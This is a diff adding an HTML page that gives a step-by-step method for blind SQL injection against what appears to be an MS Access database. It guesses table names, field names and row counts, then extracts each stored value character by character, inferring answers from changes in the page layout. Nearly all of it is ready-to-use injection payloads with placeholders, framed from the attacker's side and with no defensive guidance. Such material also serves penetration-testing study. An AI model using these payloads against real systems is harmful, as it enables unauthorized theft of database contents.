@@ -1,0 +1,59 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>More specific</title>
+</head><body><b>Step 1: Bruteforce Table Name</b><br/>
+You have to bruteforce the table name. You can use the wordlist listed below. Inject query :<br/>
+' AND (SELECT TOP 1 1 FROM TableNameToBruteforce[i])%00<br/>
+<br/>
+After injection you have to check the html response page. If table exists you should have the same html page layout (because "AND 1" has no effect on the query).<br/>
+<br/>
+<b>Step 2: Bruteforce Field Name</b><br/>
+You have to find table fields name. Inject query :<br/>
+' AND (SELECT TOP 1 FieldNameToBruteForce[j] FROM table)%00<br/>
+<br/>
+As above, you should check the html page layout to inferece the field name existence .<br/>
+<br/>
+<b>Step 3: Bruteforce Table Rows Number</b><br/>
+You have to find the number of table rows. This value will be used as "TAB_LEN" variable in the following queries/descriptions :<br/>
+' AND IIF((SELECT COUNT(*) FROM validTableName) = X, 1, 0)%00<br/>
+<br/>
+Where "X" is a number between 0 and an arbitrary value. As above you will find the correct number by checking html page layout.<br/>
+<br/>
+<b>Step 4: Bruteforce Item Length</b><br/>
+You can bruteforce the value length of a generic "ATTRIB" field at row number 1 with this query :<br/>
+' AND IIF((SELECT TOP 1 LEN(ATTRIB) FROM validTableName) = X, 1, 0)%00<br/>
+<br/>
+You can bruteforce the value length of a generic "ATTRIB" field from row 2 to TAB_LEN with this query (here N is a number between 2 and TAB_LEN, the value bruteforced before) :<br/>
+' AND IIF((SELECT TOP N LEN(ATTRIB) FROM validTableName WHERE ATTRIB&lt;&gt;'value1' AND ATTRIB&lt;&gt;'value2' ...(etc)...) = KKK,1,0)%00<br/>
+<br/>
+"KKK" is a value between 0 and an arbitrary value, while ATTRIB&lt;&gt;'valueXXX' is used because we have to select a specific line to bruteforce. The unique way I found to do this is to select the desidered row with "TOP N",and then insert in the WHERE clause all the attribute values bruteforced before. I have to say that "ATTRIB" must be the table key-field. Here is an example :<br/>
+<br/>
+<img src="image.png" /><br/>
+<br/>
+You can bruteforce fields value length for row 1 in this way :<br/>
+' AND IIF((SELECT TOP 1 LEN(A1) FROM Table) = KKK, 1, 0)%00<br/>
+' AND IIF((SELECT TOP 1 LEN(A2) FROM Table) = KKK, 1, 0)%00<br/>
+' AND IIF((SELECT TOP 1 LEN(A3) FROM Table) = KKK, 1, 0)%00<br/>
+<br/>
+While you can bruteforce fields length value of second row in this way (assuming A1 as table key-field) :<br/>
+' AND IIF((SELECT TOP 2 LEN(A1) FROM Table WHERE A1 &lt;&gt;'1111') = KKK, 1, 0)%00<br/>
+' AND IIF((SELECT TOP 2 LEN(A2) FROM Table WHERE A1 &lt;&gt; '1111') = KKK, 1, 0)%00<br/>
+' AND IIF((SELECT TOP 2 LEN(A3) FROM Table WHERE A1 &lt;&gt; '1111') = KKK, 1, 0)%00<br/>
+<br/>
+The same for row number 3 :<br/>
+' AND IIF((SELECT TOP 3 LEN(A1) FROM Table WHERE A1 &lt;&gt;'1111' AND A1 &lt;&gt; '0000') = KKK, 1, 0)%00<br/>
+' AND IIF((SELECT TOP 3 LEN(A2) FROM Table WHERE A1 &lt;&gt; '1111' AND A1 &lt;&gt; '0000') = KKK, 1, 0)%00<br/>
+' AND IIF((SELECT TOP 3 LEN(A3) FROM Table WHERE A1 &lt;&gt; '1111' AND A1 &lt;&gt; '0000') = KKK, 1, 0)%00<br/>
+<br/>
+Obviusly, before bruteforcing field value length (at row between 2 and TAB_LEN) you have to bruteforce the previous row (key) field value (you have to put it in the WHERE clause).<br/>
+<br/>
+<b>Step 5: Bruteforce Table Content</b><br/>
+Supposing that the attacker already knows the table and fields name, he will inject this query :<br/>
+' AND IIF((SELECT TOP N MID(ATTRIBxxx, XXX, 1) FROM validTableName WHERE ATT_key &lt;&gt;'value1' AND ATT_key &lt;&gt;'value2'<br/>
+... etc ... ) = CHAR(YYY), 1, 0)%00<br/>
+<br/>
+Where "N" is the row to bruteforce, "XXX" is the x-th byte of "ATTRIBxxx" to bruteforce, "ATT_key" is the table key-field and "YYY" is a number between 0 and 255 (it represents the ASCII value for a char). Here we have to use the same method mentioned before to correctly bruteforce a specific row attribute content.<br/>
+<br/>
+</body></html>
